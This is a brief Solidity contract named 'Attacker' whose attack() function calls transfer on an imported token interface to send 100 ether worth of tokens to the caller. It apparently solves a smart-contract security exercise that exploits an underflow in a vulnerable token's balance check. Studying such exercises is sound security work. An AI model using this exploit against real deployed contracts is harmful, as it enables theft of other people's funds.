// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

import "./IToken.sol";

contract Attacker{
    using SafeMath for uint;
    IToken token;

    constructor(IToken _token){
        token = _token;
    }

    function attack() public{
        token.transfer(msg.sender, 100 ether);
    }
}